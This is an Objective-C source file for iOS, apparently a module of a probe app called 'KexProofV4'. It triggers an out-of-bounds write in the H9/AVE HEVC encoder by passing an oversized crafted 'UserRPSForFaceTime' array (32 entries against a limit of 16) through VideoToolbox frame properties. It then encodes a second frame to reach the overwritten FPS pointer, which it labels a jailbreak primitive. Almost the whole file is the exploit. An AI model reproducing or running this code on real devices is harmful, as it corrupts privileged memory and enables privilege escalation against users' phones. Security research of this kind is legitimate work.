#import "KPH9EncoderModule.h"
#import <UIKit/UIKit.h>
#import "KPLog.h"
#import <VideoToolbox/VideoToolbox.h>
#import <CoreMedia/CoreMedia.h>
#import <dlfcn.h>

@interface KPH9EncoderModule ()
@property (nonatomic, copy) NSString *identifier;
@property (nonatomic, copy) NSString *title;
@property (nonatomic, copy) NSString *subtitle;
@property (nonatomic, copy) NSString *icon;
@property (nonatomic, assign) KPTestSection section;
@end

@implementation KPH9EncoderModule

- (instancetype)initWithNameSweep {
    self = [super init];
    if (self) {
        _identifier = @"h9encoder.oob";
        _title = @"H9 encoder OOB write";
        _subtitle = @"AVE_HEVC_ST_RPS_Retrieve unbounded copy -> FPS* overwrite";
        _icon = @"video";
        _section = KPTestSectionKernelProbes;
    }
    return self;
}

- (void)journal:(NSString *)line {
    NSString *path = [NSSearchPathForDirectoriesInDomains(NSDocumentDirectory, NSUserDomainMask, YES).firstObject
                      stringByAppendingPathComponent:@"kp-h9-journal.log"];
    NSFileHandle *fh = [NSFileHandle fileHandleForWritingAtPath:path];
    if (!fh) {
        [[NSFileManager defaultManager] createFileAtPath:path contents:nil attributes:nil];
        fh = [NSFileHandle fileHandleForWritingAtPath:path];
    }
    [fh seekToEndOfFile];
    [fh writeData:[[line stringByAppendingString:@"\n"] dataUsingEncoding:NSUTF8StringEncoding]];
    [fh synchronizeFile];
    [fh closeFile];
}

- (NSString *)runReport {
    NSMutableString *report = [NSMutableString string];
    [report appendString:@"=== KexProofV4 · H9 Encoder OOB Write ===\n"];
    [report appendString:@"AVE_HEVC_ST_RPS_Retrieve unbounded copy.\n"];
    [report appendString:@"Calif iOS 27.0.1 jailbreak primitive.\n"];
    [report appendFormat:@"Target: iOS %@ uid=%d\n", UIDevice.currentDevice.systemVersion, getuid()];

    // Phase 1: create encoder session
    [report appendString:@"\n--- Phase 1: create encoder session ---\n"];

    VTCompressionSessionRef session = NULL;
    OSStatus status = VTCompressionSessionCreate(
        kCFAllocatorDefault,
        1920, 1080,
        kCMVideoCodecType_HEVC,
        NULL, NULL, NULL,
        NULL, NULL,
        &session
    );
    [report appendFormat:@"VTCompressionSessionCreate: %d\n", (int)status];

    if (status != noErr || !session) {
        [report appendString:@"encoder session FAILED\n"];
        [report appendString:@"\nVERDICT: SESSION_CREATE_FAILED\n"];
        return report;
    }
    [report appendString:@"encoder session created\n"];

    // Phase 2: set UserRPSForFaceTime with crafted array
    [report appendString:@"\n--- Phase 2: crafted UserRPSForFaceTime ---\n"];

    // Create DeltaPOCS0Minus1 array with count > 16 (the unbounded copy)
    // Normal count is <= 16. We use more to trigger OOB.
    NSMutableArray *deltaArray = [NSMutableArray array];
    int32_t rpsCount = 32;  // > 16 triggers OOB

    for (int i = 0; i < rpsCount; i++) {
        // Each entry is a 16-bit value
        int16_t val = (int16_t)(0x4100 + i);
        [deltaArray addObject:@(val)];
    }
    [report appendFormat:@"DeltaPOCS0Minus1 array: %d entries\n", rpsCount];

    // Build UserRPSForFaceTime dictionary
    NSDictionary *rpsDict = @{
        @"DeltaPOCS0Minus1": deltaArray,
        @"DeltaPOCS1Minus1": @[@0],
    };

    // UserRPSForFaceTime is a FRAME PROPERTY, not session property
    // Pass it during encode via frameProperties
    [report appendString:@"\n--- Phase 2b: encode with UserRPSForFaceTime ---\n"];

    // Create pixel buffer
    CVPixelBufferRef pb = NULL;
    CVPixelBufferCreate(kCFAllocatorDefault, 1920, 1080,
                         kCVPixelFormatType_420YpCbCr8BiPlanarFullRange,
                         NULL, &pb);
    if (pb) {
        CVPixelBufferLockBaseAddress(pb, 0);
        memset(CVPixelBufferGetBaseAddress(pb), 0x80, CVPixelBufferGetDataSize(pb));
        CVPixelBufferUnlockBaseAddress(pb, 0);

        // Frame properties with UserRPSForFaceTime
        NSDictionary *frameProps = @{
            @"UserRPSForFaceTime": rpsDict,
        };

        VTEncodeInfoFlags flags = 0;
        CMTime pts = CMTimeMake(0, 30);
        CMTime dur = CMTimeMake(1, 30);

        status = VTCompressionSessionEncodeFrame(
            session, pb, pts, dur,
            (__bridge CFDictionaryRef)frameProps,
            NULL,  // sourceFrameRefcon
            &flags  // infoFlagsOut
        );
        [report appendFormat:@"encode with RPS: %d (flags=0x%x)\n", (int)status, flags];

        // Encode second frame (triggers FPS::Add through overwritten pointer)
        pts = CMTimeMake(1, 30);
        status = VTCompressionSessionEncodeFrame(
            session, pb, pts, dur,
            (__bridge CFDictionaryRef)frameProps,
            NULL, &flags
        );
        [report appendFormat:@"encode[1]: %d\n", (int)status];

        CVPixelBufferRelease(pb);
    }
    return report;
}

@end
